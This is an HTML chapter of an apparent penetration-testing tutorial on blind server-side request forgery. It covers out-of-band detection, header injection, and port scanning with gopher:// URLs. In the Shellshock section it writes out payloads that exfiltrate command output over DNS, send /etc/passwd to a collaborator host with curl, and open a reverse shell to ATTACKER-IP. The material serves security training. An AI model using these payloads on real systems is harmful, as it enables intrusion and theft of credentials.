<section id="ch6">
  <div class="chapter-header" data-ch="06">
    <div class="ch-label">Chapter 06</div>
    <h2>Blind SSRF — Detection &amp; Exploitation</h2>
    <p>No response? No problem. Out-of-band techniques turn invisible vulnerabilities into critical findings.</p>
  </div>

  <h3>6.1 Detection Without Response</h3>
  <p>When you can't see the server's response, you need to detect SSRF indirectly. The primary method is out-of-band (OOB) interaction detection using a collaborator server you control.</p>

  <div class="flow">
    <div class="flow-step">
      <div class="flow-num">1</div>
      <div class="flow-text">
        <strong>Get a Collaborator URL</strong>
        <span>In Burp Suite Pro: Burp → Burp Collaborator → Copy to clipboard. Free: interactsh.com, canarytokens.org, webhook.site</span>
      </div>
    </div>
    <div class="flow-step">
      <div class="flow-num">2</div>
      <div class="flow-text">
        <strong>Inject into every parameter</strong>
        <span>Test: URL params, POST body, headers (Referer, X-Forwarded-For, Host, Origin, User-Agent, X-Real-IP)</span>
      </div>
    </div>
    <div class="flow-step">
      <div class="flow-num">3</div>
      <div class="flow-text">
        <strong>Watch for DNS + HTTP interactions</strong>
        <span>A DNS callback confirms the server is resolving your domain. An HTTP hit confirms it actually fetched the URL.</span>
      </div>
    </div>
    <div class="flow-step ok">
      <div class="flow-num">4</div>
      <div class="flow-text">
        <strong>Escalate: prove real impact</strong>
        <span>Use gopher:// to interact with internal services, redirect to metadata, or enumerate internal ports via timing</span>
      </div>
    </div>
  </div>

  <h3>6.2 Headers to Test for Blind SSRF</h3>

  <span class="pre-label">Burp Repeater — inject OOB payload into headers</span>
  <pre>GET /product?productId=1 HTTP/1.1
Host: target.com
<span class="bad">Referer: http://YOUR-COLLABORATOR-ID.oastify.com</span>
<span class="bad">X-Forwarded-For: http://YOUR-COLLABORATOR-ID.oastify.com</span>
<span class="bad">X-Real-IP: YOUR-COLLABORATOR-ID.oastify.com</span>
<span class="bad">X-Forwarded-Host: YOUR-COLLABORATOR-ID.oastify.com</span>
<span class="bad">Origin: http://YOUR-COLLABORATOR-ID.oastify.com</span>
<span class="bad">True-Client-IP: YOUR-COLLABORATOR-ID.oastify.com</span></pre>

  <h3>6.3 Collaborator Everywhere Extension</h3>
  <p>This Burp Suite extension automates blind SSRF discovery. It passively injects non-malicious payloads into all parameters and headers during normal browsing and reports back when the Collaborator server receives an interaction:</p>

  <pre><span class="c"># Setup:
# 1. Install "Collaborator Everywhere" from BApp Store
# 2. Burp Collaborator → "Don't use Burp's own server" → configure your OOB server
# 3. Add target to Burp's scope (Target → Add to scope)
# 4. Browse the application normally
# 5. Every request automatically gets OOB payloads injected
# 6. Check Collaborator for hits — each hit identifies a vulnerable parameter</span></pre>

  <h3>6.4 Blind SSRF → Internal Port Scanning</h3>
  <p>Even without response bodies, you can fingerprint internal services via timing:</p>

  <pre><span class="c"># Closed port: immediate TCP RST → fast response (~5ms)
# Open port: established connection → slower response (~100ms+)
# Filtered port: no response → timeout (~5-30 seconds)

# Gopher to probe open/closed ports via response timing:</span>
gopher://127.0.0.1:<span class="bad">6379</span>/_   <span class="c"># Redis — open if response comes quickly</span>
gopher://127.0.0.1:<span class="bad">3306</span>/_   <span class="c"># MySQL</span>
gopher://127.0.0.1:<span class="bad">9200</span>/_   <span class="c"># Elasticsearch</span></pre>

  <h3>6.5 Blind SSRF + Shellshock (Legacy but Educational)</h3>
  <p>The most dramatic PortSwigger scenario: blind SSRF into an internal server vulnerable to Shellshock (CVE-2014-6271). Commands are executed and output is exfiltrated via DNS to your collaborator:</p>

  <pre><span class="c"># Shellshock payload in User-Agent header
# Server receives the Referer URL, fetches it, and the
# internal target processes User-Agent through bash</span>

GET /product?productId=1 HTTP/1.1
<span class="bad">Referer: http://192.168.0.X:8080/</span>       <span class="c"># Internal vulnerable server</span>
<span class="bad">User-Agent: () { :; }; /bin/nslookup $(whoami).COLLABORATOR-ID.oastify.com</span>

<span class="c"># $(whoami) gets executed on the internal server
# Output is sent via DNS lookup to your Collaborator
# You see: root.COLLABORATOR-ID.oastify.com in Collaborator interactions</span>

<span class="c"># More useful Shellshock payloads:</span>
User-Agent: () { :; }; /usr/bin/curl http://COLLABORATOR/$(cat /etc/passwd | base64)
User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ATTACKER-IP/4444 0&gt;&amp;1</pre>

</section>

